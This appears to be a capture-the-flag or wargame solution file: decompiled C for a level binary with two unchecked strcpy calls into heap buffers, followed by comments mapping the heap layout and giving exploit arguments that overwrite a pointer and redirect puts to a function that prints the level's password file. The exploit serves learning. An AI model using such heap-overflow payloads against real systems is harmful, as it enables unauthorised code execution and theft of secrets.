#include <time.h>

void m() // (0x080484f4)
{
    time_t actual_time = time(NULL);
    printf("%s - %d", 0x08049960, actual_time);
}

struct pouet {
    int index;
    char *ptr;
};

int main(int argc, char **argv)
{
    struct pouet *m1 = malloc(sizeof(struct pouet)); // malloc 8 0x0804a008 - ESP+0x1c
    m1->index = 1;

    void *m2 = malloc(8); // 0x0804a018 - ESP+0x1c
    m1->ptr = m2;

    struct pouet *m3 = malloc(sizeof(struct pouet)); // 0x0804a028 - ESP+0x18
    m3->index = 2;

    void *m4 = malloc(8); // 0x0804a038
    m3->ptr = m4;

    // [EBP+0xc] = pointer to argv[0]
    // add 4 = pointer to argv[1]
    // add 8 = pointer to argv[2]

    strcpy((int *)m1->ptr, argv[1]);
    strcpy((int *)m3->ptr, argv[2]);

    void *handle = fopen("/home/user/level8/.pass", "r"); // strings in .rodata
    char *res = fgets(0x08049960, 68, handle);

    // The goal is to call m() here

    puts("~~"); // (string in .rodata : 0x08048703)
}
//     4         4              8             8             8           4             4            8             8
// [ idx 1 ] [ ptr 1 -> m2 ] [metadata]  [ buffer m2 ] [ metadata ] [ idx 3 ] [ ptr 3 -> m4 ] [ metadata ][ buffer m4 ]
//                                                     > redirect to  -> 0x8049928
// ARG1 : "AAAABBBB" + "CCCCDDDD" + "EEEE" + "\x28\x99\x04\x08"
// ARG2 : "\xf4\x84\x04\x08"